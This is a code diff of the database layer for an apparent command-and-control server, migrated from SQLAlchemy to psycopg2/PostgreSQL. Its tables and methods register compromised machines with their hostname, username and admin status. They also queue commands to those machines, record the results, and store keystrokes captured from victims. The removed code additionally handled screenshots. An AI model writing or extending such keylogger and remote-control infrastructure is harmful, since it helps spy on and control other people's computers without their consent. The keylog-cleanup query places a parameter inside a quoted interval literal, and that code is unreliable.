@@ -1,387 +1,420 @@
-from sqlalchemy import create_engine, Column, Integer, String, Text, Float, Boolean, DateTime, ForeignKey, TypeDecorator, JSON
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker, relationship
-from datetime import datetime
+import psycopg2
+from psycopg2.extras import RealDictCursor
 import json
 import os
-
-# Custom JSON type for SQLite compatibility
-class JSONEncoded(TypeDecorator):
-    impl = Text
-    cache_ok = True
-    
-    def process_bind_param(self, value, dialect):
-        if value is not None:
-            return json.dumps(value)
-        return None
-    
-    def process_result_value(self, value, dialect):
-        if value is not None:
-            return json.loads(value)
-        return None
-
-Base = declarative_base()
-
-class Client(Base):
-    __tablename__ = 'clients'
-    
-    id = Column(Integer, primary_key=True)
-    client_id = Column(String(100), unique=True, nullable=False, index=True)
-    ip_address = Column(String(50))
-    hostname = Column(String(100))
-    username = Column(String(100))
-    platform = Column(String(50))
-    platform_version = Column(String(100))
-    architecture = Column(String(50))
-    first_seen = Column(DateTime, default=datetime.utcnow)
-    last_seen = Column(DateTime, default=datetime.utcnow)
-    checkin_count = Column(Integer, default=0)
-    online = Column(Boolean, default=True)
-    system_info = Column(JSON)
-    
-    # Relations
-    heartbeats = relationship("Heartbeat", back_populates="client", cascade="all, delete-orphan")
-    commands = relationship("Command", back_populates="client", cascade="all, delete-orphan")
-    keylogs = relationship("Keylog", back_populates="client", cascade="all, delete-orphan")
-    screenshots = relationship("Screenshot", back_populates="client", cascade="all, delete-orphan")
-    events = relationship("Event", back_populates="client", cascade="all, delete-orphan")
-    
-    def to_dict(self):
-        return {
-            'id': self.id,
-            'client_id': self.client_id,
-            'ip': self.ip_address,
-            'hostname': self.hostname,
-            'username': self.username,
-            'platform': self.platform,
-            'platform_version': self.platform_version,
-            'architecture': self.architecture,
-            'first_seen': self.first_seen.timestamp() if self.first_seen else None,
-            'last_seen': self.last_seen.timestamp() if self.last_seen else None,
-            'checkin_count': self.checkin_count,
-            'online': self.online,
-            'system_info': self.system_info or {}
-        }
-
-
-class Heartbeat(Base):
-    __tablename__ = 'heartbeats'
-    
-    id = Column(Integer, primary_key=True)
-    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
-    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
-    
-    client = relationship("Client", back_populates="heartbeats")
-
-
-class Command(Base):
-    __tablename__ = 'commands'
-    
-    id = Column(Integer, primary_key=True)
-    command_id = Column(String(100), unique=True, nullable=False, index=True)
-    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
-    action = Column(String(100), nullable=False, index=True)
-    data = Column(JSON)
-    status = Column(String(50), default='pending', index=True)  # pending, sent, completed, failed
-    created_at = Column(DateTime, default=datetime.utcnow, index=True)
-    sent_at = Column(DateTime)
-    completed_at = Column(DateTime)
-    result = Column(JSON)
-    error = Column(Text)
-    
-    client = relationship("Client", back_populates="commands")
-    
-    def to_dict(self):
-        return {
-            'id': self.id,
-            'command_id': self.command_id,
-            'client_id': self.client_id,
-            'action': self.action,
-            'data': self.data,
-            'status': self.status,
-            'created_at': self.created_at.isoformat() if self.created_at else None,
-            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
-            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
-            'result': self.result,
-            'error': self.error
-        }
-
-
-class Keylog(Base):
-    __tablename__ = 'keylogs'
-    
-    id = Column(Integer, primary_key=True)
-    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
-    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
-    window = Column(String(500))
-    keystroke = Column(String(100))
-    
-    client = relationship("Client", back_populates="keylogs")
-    
-    def to_dict(self):
-        return {
-            'id': self.id,
-            'client_id': self.client_id,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
-            'window': self.window,
-            'keystroke': self.keystroke
-        }
-
-
-class Screenshot(Base):
-    __tablename__ = 'screenshots'
-    
-    id = Column(Integer, primary_key=True)
-    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
-    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
-    width = Column(Integer)
-    height = Column(Integer)
-    quality = Column(Integer)
-    size_kb = Column(Float)
-    file_path = Column(String(500))  # Chemin vers le fichier sauvegardé
-    data = Column(Text)  # Base64 si on veut stocker en BD
-    
-    client = relationship("Client", back_populates="screenshots")
-    
-    def to_dict(self):
-        return {
-            'id': self.id,
-            'client_id': self.client_id,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
-            'width': self.width,
-            'height': self.height,
-            'quality': self.quality,
-            'size_kb': self.size_kb,
-            'file_path': self.file_path
-        }
-
-
-class Event(Base):
-    __tablename__ = 'events'
-    
-    id = Column(Integer, primary_key=True)
-    client_id = Column(String(100), ForeignKey('clients.client_id'), index=True)
-    event_type = Column(String(50), nullable=False, index=True)  # register, disconnect, error, etc.
-    description = Column(Text)
-    data = Column(JSON)
-    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
-    severity = Column(String(20), default='info', index=True)  # info, warning, error, critical
-    
-    client = relationship("Client", back_populates="events")
-    
-    def to_dict(self):
-        return {
-            'id': self.id,
-            'client_id': self.client_id,
-            'event_type': self.event_type,
-            'description': self.description,
-            'data': self.data,
-            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
-            'severity': self.severity
-        }
+from datetime import datetime
+import time
 
 
 class DatabaseManager:
-    def __init__(self, db_url=None):
-        # Si pas d'URL fournie, utiliser variable d'environnement ou SQLite
-        if db_url is None:
-            db_url = os.getenv('DATABASE_URL', 'sqlite:///c2_server.db')
-            # Render utilise postgres:// mais SQLAlchemy requiert postgresql://
-            if db_url.startswith('postgres://'):
-                db_url = db_url.replace('postgres://', 'postgresql://', 1)
-        
-        self.engine = create_engine(db_url, echo=False)
-        Base.metadata.create_all(self.engine)
-        Session = sessionmaker(bind=self.engine)
-        self.session = Session()
+    def __init__(self, database_url=None):
+        """Initialize database connection with Supabase/PostgreSQL"""
+        self.database_url = database_url or os.getenv('DATABASE_URL')
+        self.conn = None
+        self.connect()
     
-    def close(self):
-        self.session.close()
+    def connect(self):
+        """Establish database connection"""
+        try:
+            if self.database_url:
+                self.conn = psycopg2.connect(self.database_url, cursor_factory=RealDictCursor)
+                self.conn.autocommit = True
+                print("[DB] Connected to PostgreSQL database")
+                self.init_tables()
+            else:
+                print("[DB] No database URL provided - using in-memory storage")
+        except Exception as e:
+            print(f"[DB] Connection error: {e}")
+            self.conn = None
     
-    # Client operations
-    def get_or_create_client(self, client_id, system_info, ip_address):
-        client = self.session.query(Client).filter_by(client_id=client_id).first()
+    def init_tables(self):
+        """Create tables if they don't exist"""
+        if not self.conn:
+            return
         
-        if not client:
-            client = Client(
-                client_id=client_id,
-                ip_address=ip_address,
-                hostname=system_info.get('hostname', 'Unknown'),
-                username=system_info.get('username', 'Unknown'),
-                platform=system_info.get('platform', 'Unknown'),
-                platform_version=system_info.get('platform_version', ''),
-                architecture=system_info.get('architecture', ''),
-                system_info=system_info,
-                first_seen=datetime.utcnow(),
-                last_seen=datetime.utcnow(),
-                online=True,
-                checkin_count=1
-            )
-            self.session.add(client)
-            self.log_event(client_id, 'register', 'Client registered', system_info, 'info')
-        else:
-            client.last_seen = datetime.utcnow()
-            client.ip_address = ip_address
-            client.system_info = system_info
-            client.online = True
-            client.checkin_count += 1
+        try:
+            cursor = self.conn.cursor()
+            
+            # Clients table with detailed machine information
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS clients (
+                    client_id VARCHAR(255) PRIMARY KEY,
+                    ip VARCHAR(45),
+                    hostname VARCHAR(255),
+                    os_type VARCHAR(50),
+                    os_version VARCHAR(255),
+                    os_release VARCHAR(255),
+                    architecture VARCHAR(50),
+                    cpu_count INTEGER,
+                    cpu_model VARCHAR(255),
+                    total_ram BIGINT,
+                    username VARCHAR(255),
+                    computer_name VARCHAR(255),
+                    is_admin BOOLEAN DEFAULT FALSE,
+                    system_info JSONB,
+                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    checkin_count INTEGER DEFAULT 0
+                )
+            """)
+            
+            # Commands table (merged with results)
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS commands (
+                    id SERIAL PRIMARY KEY,
+                    client_id VARCHAR(255) REFERENCES clients(client_id) ON DELETE CASCADE,
+                    command_type VARCHAR(50),
+                    command_data JSONB,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    status VARCHAR(20) DEFAULT 'pending',
+                    executed_at TIMESTAMP,
+                    result_data JSONB,
+                    error_message TEXT,
+                    execution_time FLOAT
+                )
+            """)
+            
+            # Keylogs table
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS keylogs (
+                    id SERIAL PRIMARY KEY,
+                    client_id VARCHAR(255) REFERENCES clients(client_id) ON DELETE CASCADE,
+                    keystrokes TEXT,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    metadata JSONB
+                )
+            """)
+            
+            # Create indexes for performance
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_os_type ON clients(os_type)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_hostname ON clients(hostname)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands(client_id)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_keylogs_client_id ON keylogs(client_id)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_keylogs_timestamp ON keylogs(timestamp)")
+            
+            cursor.close()
+            print("[DB] Tables initialized successfully")
+        except Exception as e:
+            print(f"[DB] Error initializing tables: {e}")
+    
+    # ==================== CLIENT OPERATIONS ====================
+    
+    def register_client(self, client_id, system_info, ip):
+        """Register or update a client with detailed machine information"""
+        if not self.conn:
+            return False
         
-        self.session.commit()
-        return client
+        try:
+            # Extract detailed information from system_info
+            platform_info = system_info.get('platform', {})
+            hardware_info = system_info.get('hardware', {})
+            user_info = system_info.get('user', {})
+            privileges_info = system_info.get('privileges', {})
+            
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                INSERT INTO clients (
+                    client_id, ip, hostname, os_type, os_version, os_release, 
+                    architecture, cpu_count, cpu_model, total_ram, username, 
+                    computer_name, is_admin, system_info, first_seen, last_seen, checkin_count
+                )
+                VALUES (
+                    %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, 
+                    CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1
+                )
+                ON CONFLICT (client_id) 
+                DO UPDATE SET 
+                    ip = EXCLUDED.ip,
+                    hostname = EXCLUDED.hostname,
+                    os_type = EXCLUDED.os_type,
+                    os_version = EXCLUDED.os_version,
+                    os_release = EXCLUDED.os_release,
+                    architecture = EXCLUDED.architecture,
+                    cpu_count = EXCLUDED.cpu_count,
+                    cpu_model = EXCLUDED.cpu_model,
+                    total_ram = EXCLUDED.total_ram,
+                    username = EXCLUDED.username,
+                    computer_name = EXCLUDED.computer_name,
+                    is_admin = EXCLUDED.is_admin,
+                    system_info = EXCLUDED.system_info,
+                    last_seen = CURRENT_TIMESTAMP,
+                    checkin_count = clients.checkin_count + 1
+            """, (
+                client_id,
+                ip,
+                platform_info.get('hostname', 'Unknown'),
+                platform_info.get('system', 'Unknown'),
+                platform_info.get('version', 'Unknown'),
+                platform_info.get('release', 'Unknown'),
+                platform_info.get('machine', 'Unknown'),
+                hardware_info.get('cpu_count', 0),
+                hardware_info.get('cpu_model', 'Unknown'),
+                hardware_info.get('total_ram', 0),
+                user_info.get('username', 'Unknown'),
+                user_info.get('computer_name', 'Unknown'),
+                privileges_info.get('is_admin', False),
+                json.dumps(system_info)
+            ))
+            cursor.close()
+            return True
+        except Exception as e:
+            print(f"[DB] Error registering client: {e}")
+            return False
     
     def update_client_heartbeat(self, client_id):
-        client = self.session.query(Client).filter_by(client_id=client_id).first()
-        if client:
-            client.last_seen = datetime.utcnow()
-            client.checkin_count += 1
-            client.online = True
-            
-            # Enregistrer le heartbeat
-            heartbeat = Heartbeat(client_id=client_id, timestamp=datetime.utcnow())
-            self.session.add(heartbeat)
-            
-            self.session.commit()
+        """Update client last_seen timestamp"""
+        if not self.conn:
+            return False
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                UPDATE clients 
+                SET last_seen = CURRENT_TIMESTAMP,
+                    checkin_count = checkin_count + 1
+                WHERE client_id = %s
+            """, (client_id,))
+            cursor.close()
             return True
-        return False
-    
-    def get_all_clients(self):
-        clients = self.session.query(Client).all()
-        
-        # Marquer offline les clients inactifs (> 60 secondes)
-        current_time = datetime.utcnow()
-        for client in clients:
-            if client.last_seen:
-                time_diff = (current_time - client.last_seen).total_seconds()
-                client.online = time_diff < 60
-        
-        self.session.commit()
-        return [c.to_dict() for c in clients]
+        except Exception as e:
+            print(f"[DB] Error updating heartbeat: {e}")
+            return False
     
     def get_client(self, client_id):
-        return self.session.query(Client).filter_by(client_id=client_id).first()
+        """Get client information with detailed machine data"""
+        if not self.conn:
+            return None
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                SELECT client_id, ip, hostname, os_type, os_version, os_release,
+                       architecture, cpu_count, cpu_model, total_ram, username,
+                       computer_name, is_admin, system_info, first_seen, last_seen, checkin_count
+                FROM clients 
+                WHERE client_id = %s
+            """, (client_id,))
+            result = cursor.fetchone()
+            cursor.close()
+            return dict(result) if result else None
+        except Exception as e:
+            print(f"[DB] Error getting client: {e}")
+            return None
     
-    # Command operations
-    def create_command(self, command_id, client_id, action, data):
-        command = Command(
-            command_id=command_id,
-            client_id=client_id,
-            action=action,
-            data=data,
-            status='pending',
-            created_at=datetime.utcnow()
-        )
-        self.session.add(command)
-        self.log_event(client_id, 'command_created', f'Command {action} created', {'command_id': command_id}, 'info')
-        self.session.commit()
-        return command
+    def get_all_clients(self):
+        """Get all clients with detailed information"""
+        if not self.conn:
+            return []
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                SELECT client_id, ip, hostname, os_type, os_version, os_release,
+                       architecture, cpu_count, cpu_model, total_ram, username,
+                       computer_name, is_admin, system_info, first_seen, last_seen, checkin_count
+                FROM clients 
+                ORDER BY last_seen DESC
+            """)
+            results = cursor.fetchall()
+            cursor.close()
+            return [dict(row) for row in results]
+        except Exception as e:
+            print(f"[DB] Error getting all clients: {e}")
+            return []
+    
+    def delete_inactive_clients(self, inactive_seconds=3600):
+        """Delete clients inactive for more than specified seconds"""
+        if not self.conn:
+            return 0
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                DELETE FROM clients 
+                WHERE EXTRACT(EPOCH FROM (CURRENT_TIMESTAMP - last_seen)) > %s
+                RETURNING client_id
+            """, (inactive_seconds,))
+            deleted = cursor.fetchall()
+            cursor.close()
+            return len(deleted)
+        except Exception as e:
+            print(f"[DB] Error deleting inactive clients: {e}")
+            return 0
+    
+    # ==================== COMMAND OPERATIONS ====================
+    
+    def add_pending_command(self, client_id, command_type, command_data):
+        """Add a pending command for a client"""
+        if not self.conn:
+            return None
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                INSERT INTO commands (client_id, command_type, command_data, status)
+                VALUES (%s, %s, %s, 'pending')
+                RETURNING id
+            """, (client_id, command_type, json.dumps(command_data)))
+            command_id = cursor.fetchone()['id']
+            cursor.close()
+            return command_id
+        except Exception as e:
+            print(f"[DB] Error adding pending command: {e}")
+            return None
     
     def get_pending_commands(self, client_id):
-        commands = self.session.query(Command).filter_by(
-            client_id=client_id,
-            status='pending'
-        ).all()
+        """Get all pending commands for a client"""
+        if not self.conn:
+            return []
         
-        # Marquer comme sent
-        for cmd in commands:
-            cmd.status = 'sent'
-            cmd.sent_at = datetime.utcnow()
-        
-        self.session.commit()
-        return commands
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                SELECT id, command_type, command_data, created_at
+                FROM commands 
+                WHERE client_id = %s AND status = 'pending'
+                ORDER BY created_at ASC
+            """, (client_id,))
+            results = cursor.fetchall()
+            cursor.close()
+            return [dict(row) for row in results]
+        except Exception as e:
+            print(f"[DB] Error getting pending commands: {e}")
+            return []
     
-    def update_command_result(self, command_id, result):
-        command = self.session.query(Command).filter_by(command_id=command_id).first()
-        if command:
-            command.result = result
-            command.status = 'completed' if not result.get('error') else 'failed'
-            command.completed_at = datetime.utcnow()
-            
-            if result.get('error'):
-                command.error = str(result.get('error'))
-                self.log_event(command.client_id, 'command_failed', f'Command {command.action} failed', result, 'error')
-            else:
-                self.log_event(command.client_id, 'command_completed', f'Command {command.action} completed', None, 'info')
-            
-            self.session.commit()
+    def update_command_result(self, command_id, result_data, execution_time=None, error_message=None):
+        """Update command with result data (replaces mark_command_executed and store_command_result)"""
+        if not self.conn:
+            return False
+        
+        try:
+            cursor = self.conn.cursor()
+            status = 'failed' if error_message else 'executed'
+            cursor.execute("""
+                UPDATE commands 
+                SET status = %s,
+                    executed_at = CURRENT_TIMESTAMP,
+                    result_data = %s,
+                    error_message = %s,
+                    execution_time = %s
+                WHERE id = %s
+            """, (status, json.dumps(result_data) if result_data else None, error_message, execution_time, command_id))
+            cursor.close()
             return True
-        return False
+        except Exception as e:
+            print(f"[DB] Error updating command result: {e}")
+            return False
     
-    def get_command_result(self, command_id):
-        command = self.session.query(Command).filter_by(command_id=command_id).first()
-        return command.to_dict() if command else None
+    def mark_command_executed(self, command_id):
+        """Mark a command as executed (legacy method, use update_command_result instead)"""
+        return self.update_command_result(command_id, None)
     
-    # Keylog operations
-    def save_keylogs(self, client_id, logs):
-        for log in logs:
-            keylog = Keylog(
-                client_id=client_id,
-                timestamp=datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')) if 'timestamp' in log else datetime.utcnow(),
-                window=log.get('window', ''),
-                keystroke=log.get('keystroke', '')
-            )
-            self.session.add(keylog)
+    def clear_pending_commands(self, client_id):
+        """Clear all pending commands for a client"""
+        if not self.conn:
+            return False
         
-        self.session.commit()
-        self.log_event(client_id, 'keylogs_received', f'Received {len(logs)} keylogs', None, 'info')
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                DELETE FROM commands 
+                WHERE client_id = %s AND status = 'pending'
+            """, (client_id,))
+            cursor.close()
+            return True
+        except Exception as e:
+            print(f"[DB] Error clearing pending commands: {e}")
+            return False
     
-    def get_keylogs(self, client_id, limit=100):
-        keylogs = self.session.query(Keylog).filter_by(client_id=client_id).order_by(Keylog.timestamp.desc()).limit(limit).all()
-        return [k.to_dict() for k in keylogs]
+    def get_command_results(self, client_id, limit=100):
+        """Get command results for a client (from unified commands table)"""
+        if not self.conn:
+            return []
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                SELECT id, command_type, command_data, result_data, 
+                       status, created_at, executed_at, execution_time, error_message
+                FROM commands 
+                WHERE client_id = %s AND status IN ('executed', 'failed')
+                ORDER BY executed_at DESC
+                LIMIT %s
+            """, (client_id, limit))
+            results = cursor.fetchall()
+            cursor.close()
+            return [dict(row) for row in results]
+        except Exception as e:
+            print(f"[DB] Error getting command results: {e}")
+            return []
     
-    def get_keylogs_count(self, client_id):
-        return self.session.query(Keylog).filter_by(client_id=client_id).count()
+    # ==================== KEYLOG OPERATIONS ====================
     
-    # Event logging
-    def log_event(self, client_id, event_type, description, data=None, severity='info'):
-        event = Event(
-            client_id=client_id,
-            event_type=event_type,
-            description=description,
-            data=data,
-            severity=severity,
-            timestamp=datetime.utcnow()
-        )
-        self.session.add(event)
-        self.session.commit()
+    def store_keylog(self, client_id, keystrokes, metadata=None):
+        """Store keylog data"""
+        if not self.conn:
+            return None
+        
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                INSERT INTO keylogs (client_id, keystrokes, metadata)
+                VALUES (%s, %s, %s)
+                RETURNING id
+            """, (client_id, keystrokes, json.dumps(metadata or {})))
+            keylog_id = cursor.fetchone()['id']
+            cursor.close()
+            return keylog_id
+        except Exception as e:
+            print(f"[DB] Error storing keylog: {e}")
+            return None
     
-    def get_events(self, client_id=None, event_type=None, limit=100):
-        query = self.session.query(Event)
+    def get_keylogs(self, client_id, limit=1000):
+        """Get keylogs for a client"""
+        if not self.conn:
+            return []
         
-        if client_id:
-            query = query.filter_by(client_id=client_id)
-        if event_type:
-            query = query.filter_by(event_type=event_type)
-        
-        events = query.order_by(Event.timestamp.desc()).limit(limit).all()
-        return [e.to_dict() for e in events]
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                SELECT id, keystrokes, timestamp, metadata
+                FROM keylogs 
+                WHERE client_id = %s
+                ORDER BY timestamp DESC
+                LIMIT %s
+            """, (client_id, limit))
+            results = cursor.fetchall()
+            cursor.close()
+            return [dict(row) for row in results]
+        except Exception as e:
+            print(f"[DB] Error getting keylogs: {e}")
+            return []
     
-    # Statistics
-    def get_statistics(self):
-        total_clients = self.session.query(Client).count()
-        online_clients = self.session.query(Client).filter_by(online=True).count()
-        total_commands = self.session.query(Command).count()
-        pending_commands = self.session.query(Command).filter_by(status='pending').count()
-        total_keylogs = self.session.query(Keylog).count()
-        total_events = self.session.query(Event).count()
+    def delete_old_keylogs(self, hours=24):
+        """Delete keylogs older than specified hours"""
+        if not self.conn:
+            return 0
         
-        return {
-            'total_clients': total_clients,
-            'online_clients': online_clients,
-            'total_commands': total_commands,
-            'pending_commands': pending_commands,
-            'total_keylogs': total_keylogs,
-            'total_events': total_events
-        }
+        try:
+            cursor = self.conn.cursor()
+            cursor.execute("""
+                DELETE FROM keylogs 
+                WHERE timestamp < CURRENT_TIMESTAMP - INTERVAL '%s hours'
+                RETURNING id
+            """, (hours,))
+            deleted = cursor.fetchall()
+            cursor.close()
+            return len(deleted)
+        except Exception as e:
+            print(f"[DB] Error deleting old keylogs: {e}")
+            return 0
     
-    # Cleanup old data
-    def cleanup_old_data(self, days=30):
-        from datetime import timedelta
-        cutoff_date = datetime.utcnow() - timedelta(days=days)
-        
-        # Delete old heartbeats
-        self.session.query(Heartbeat).filter(Heartbeat.timestamp < cutoff_date).delete()
-        
-        # Delete old events
-        self.session.query(Event).filter(Event.timestamp < cutoff_date).delete()
-        
-        self.session.commit()
+    # ==================== UTILITY ====================
+    
+    def close(self):
+        """Close database connection"""
+        if self.conn:
+            self.conn.close()
+            print("[DB] Database connection closed")
